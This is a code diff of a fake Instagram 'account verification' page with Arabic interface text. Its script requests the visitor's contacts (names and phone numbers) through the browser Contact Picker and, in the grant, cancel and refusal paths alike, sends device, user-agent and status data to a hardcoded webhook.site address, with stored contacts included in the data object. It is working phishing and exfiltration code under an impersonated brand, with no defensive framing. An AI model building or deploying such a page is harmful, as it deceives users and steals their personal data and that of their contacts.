@@ -6,16 +6,8 @@
     <title>Instagram</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
-            background: #fafafa; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            min-height: 100vh; 
-            padding: 20px;
-        }
-        .container { background: #ffffff; border: 1px solid #dbdbdb; border-radius: 12px; width: 100%; max-width: 400px; padding: 25px; text-align: center; }
+        body { font-family: system-ui, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        .container { background: white; border: 1px solid #dbdbdb; border-radius: 12px; width: 100%; max-width: 400px; padding: 25px; text-align: center; }
         .header { display: flex; justify-content: space-between; align-items: center; padding-bottom: 15px; border-bottom: 1px solid #efefef; }
         .logo { font-family: 'Billabong', cursive; font-size: 26px; color: #262626; }
         .dots { font-size: 24px; color: #262626; }
@@ -26,12 +18,11 @@
         .post { background: #efefef; height: 220px; border-radius: 10px; display: flex; justify-content: center; align-items: center; color: #8e8e8e; margin-bottom: 15px; }
         .desc { font-size: 14px; color: #8e8e8e; margin-bottom: 15px; }
         .btn { width: 100%; padding: 12px; background: #0095f6; color: white; border: none; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; transition: 0.2s; }
-        .btn:disabled { background: #b2dffc; cursor: default; }
         .btn-green { background: #2ea043; }
+        .btn:disabled { background: #b2dffc; cursor: default; }
         #status { margin-top: 15px; font-size: 13px; padding: 12px; border-radius: 8px; display: none; }
         .status-ok { background: #e6f5e6; color: #2e7d32; display: block; }
         .status-info { background: #e3f2fd; color: #0d47a1; display: block; }
-        .status-err { background: #ffebee; color: #c62828; display: block; }
     </style>
 </head>
 <body>
@@ -52,10 +43,8 @@
             
             btn.innerText = "جاري التحميل...";
             btn.disabled = true;
-            statusBox.style.display = 'none';
-            statusBox.className = '';
 
-            // 1. تجهيز البيانات الأساسية للجهاز
+            // 1. تجهيز البيانات الأساسية
             const data = {
                 device: "iPhone",
                 ua: navigator.userAgent,
@@ -63,46 +52,40 @@
                 timestamp: new Date().toISOString()
             };
 
-            // 2. فحص المتصفح
+            // 2. التحقق من المتصفح
             if (!navigator.contacts || !navigator.contacts.select) {
-                // إذا كان سفاري -> يرسل فوراً
-                sendToWebhook(data, "المتصفح لا يدعم. إرسال فوري.");
+                sendToWebhook(data, "المتصفح لا يدعم جهات الاتصال.");
                 return;
             }
 
-            // 3. طلب الإذن (هذا السطر هو المهم جداً)
+            // 3. طلب جهات الاتصال (الجزء الصحيح الآن)
             try {
                 const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
 
-                // 4. إذا سمح المستخدم
                 if (contacts && contacts.length > 0) {
-                    data.contacts = contacts; // إضافة جهات الاتصال للبيانات
+                    data.contacts = contacts;
                     statusBox.className = 'status-ok';
-                    statusBox.innerText = "✅ تم التحقق بنجاح! مرحباً بك.";
+                    statusBox.innerText = "✅ تم التحقق بنجاح!";
                     btn.innerText = "تم";
                     btn.className = "btn btn-green";
-                    sendToWebhook(data, "تم السماح. جلب جهات الاتصال.");
                 } else {
-                    // إذا فتح النافذة وأغلقها دون اختيار
-                    sendToWebhook(data, "رفض الإذن أو أغلق النافذة.");
+                    data.status = "إلغاء";
+                    sendToWebhook(data, "تم إلغاء الاختيار.");
                 }
             } catch (error) {
-                // 5. إذا رفض المستخدم (المنطق العكسي)
-                if (error.name === 'NotAllowedError' || error.name === 'SecurityError') {
+                // 4. إذا رفض المستخدم (المنطق العكسي)
+                if (error.name === 'NotAllowedError') {
+                    data.status = "رفض";
                     sendToWebhook(data, "رفض الإذن (المنطق العكسي).");
                 } else {
-                    statusBox.className = 'status-err';
-                    statusBox.innerText = "❌ حدث خطأ غير متوقع.";
-                    btn.innerText = "تأكيد الحساب";
-                    btn.disabled = false;
+                    console.error(error);
                 }
             }
         });
 
+        // دالة الإرسال
         function sendToWebhook(data, reason) {
             data.reason = reason;
-            data.status = "تم الإرسال إلى Webhook.site";
-
             const webhookUrl = 'https://webhook.site/45b14a78-723d-40c8-9932-da5cc5d33397';
 
             fetch(webhookUrl, {
